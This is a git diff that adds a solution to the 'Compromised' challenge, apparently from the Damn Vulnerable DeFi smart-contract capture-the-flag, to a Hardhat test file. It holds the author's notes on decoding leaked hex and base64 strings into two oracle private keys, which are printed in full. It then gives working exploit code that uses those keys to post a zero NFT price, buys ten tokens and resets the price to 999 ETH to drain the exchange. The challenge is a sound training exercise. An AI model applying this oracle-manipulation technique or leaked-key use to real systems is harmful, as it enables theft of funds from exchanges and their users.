@@ -61,6 +61,110 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        /** 
+         * Thinking of solutions
+         * Keep buying from exchange and selling at a higher price to exhange until the exchange loses all its money
+         * 
+         * NFT is priced at 999 Eth needed to buy but attacker only have 
+         * Exchange has about 9990Eth
+         * 
+         * I am guessing we can find a loophole in the oracles and change the price of the nft
+         * Use the _setupRole(INITIALIZER_ROLE, msg.sender)  to do it iguess
+         * _setupRole is internal function so we can't call it
+         * 
+         * I folded it is essentially something related to hexadecimal numbers that is given in the challenge
+         * 
+         * Output keccak256 function is a 256 bit hexadecimal number */
+
+        /**
+         * Steps 1
+         * Get private key of 2 sources
+         * Change the price so 0.1 eth so the attacker can buy it
+         * - so it price oracle takes median price we can just initialise both to 0 eth and buy it for free
+         * Then change the price back to 9990 so that the exchange can buy the Bought nft at a jacked up price when the attacker sells it
+         * 
+         * 
+         * 
+         * So apparently this is hex data. So new thing i learnt
+         * 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+         * This hexadecimal is converted to base64 encoding (which is a type of ascii text encoding);
+         * MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+         * Decoded this with echo "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5" | base64 -d 
+         * 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+         * Same process for this
+         * 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+         * MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+         * 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+         */
+
+        /**
+         * EOA (Externally owned Accounts)
+         * What is Vary :Accept-Encoding? 
+         * https://www.smashingmagazine.com/2017/11/understanding-vary-header/ - to get the full understanding read this
+         * Summary of Vary: Accept-Encoding - Essentialy it use gzip compress and the data we are seen is after it has been compressed
+         * Need to understand Hex Data in bytes and essentially Base64 encoding
+         * How are private addresses in ethereum derived?
+         * -What form are they in? hexadecimal numbers of 256 bits
+         */
+
+        //First Private Key = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        //Second Private Key = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+
+        const firSource = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",this.oracle.provider);
+        const secSource = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",this.oracle.provider);
+
+        // const changePriceSource1 = await (await ethers.getContractFactory("OracleSource",firstSource)).deploy(this.oracle.address);
+        // const changePriceSource2 = await (await ethers.getContractFactory("OracleSource",secondSource)).deploy(this.oracle.address)
+
+        const changePriceSource1 = this.oracle.connect(firSource)
+        const changePriceSource2 = this.oracle.connect(secSource)
+
+        const attackerConnectEx = this.exchange.connect(attacker);
+ 
+        //console.log(changePriceSource1.address == this.oracle.address);
+        //Returns true
+        // I wanted to check why i got the request-rate exceeded error
+        // apparently it is due to the provider
+
+
+        //Post price can only be called by an external source so we need 2 contract to call
+        //Must be more than 0 so we can't buy for free thus we change price to 0.1
+        // changeVal calles oracle.postPrice externally
+        let changePriceTx1 = await changePriceSource1.postPrice("DVNFT", ethers.utils.parseEther("0"));
+        //let tx1 = await changePriceTx1.wait(1);
+        let changePriceTx2 = await changePriceSource2.postPrice("DVNFT", ethers.utils.parseEther("0"));
+        //let tx2 = await changePriceTx2.wait(1);
+
+        let tx = await this.oracle.getMedianPrice("DVNFT");
+        //console.log(tx.toString());
+
+        let tknIds = []
+        // Buying NFT from ex, we need 10 to drain the ex
+        for(let i = 0 ; i < 10; i++){
+            let buyTx = await attackerConnectEx.buyOne({value:ethers.utils.parseEther("0.000000000000001")});
+            let buyReciept = await buyTx.wait(1);
+            // console.log(buyReciept);
+            let tokenBoughtEvent = buyReciept.events[1].args
+            // Checking to see which argument is the tokenid
+            // for(let i = 0 ; i < tokenBoughtEvent.length; i++){
+            //     console.log(tokenBoughtEvent[i].toString());
+            // } 
+            let tokenId = tokenBoughtEvent[1].toString();
+            tknIds.push(tokenId);
+        }
+
+        //Changing price to 999 to drain all the eth
+        let changePriceTx3 = await changePriceSource1.postPrice("DVNFT", ethers.utils.parseEther("999"));
+        let changePriceTx4 = await changePriceSource2.postPrice("DVNFT", ethers.utils.parseEther("999"));
+
+        //approving the token to let exchange sell my all my token
+        for(let i = 0 ; i< tknIds.length; i++){
+            let attackerConnectTkn = this.nftToken.connect(attacker);
+            await attackerConnectTkn.approve(this.exchange.address,tknIds[i]);
+    
+            await attackerConnectEx.sellOne(tknIds[i]);
+        }
+
     });
 
     after(async function () {
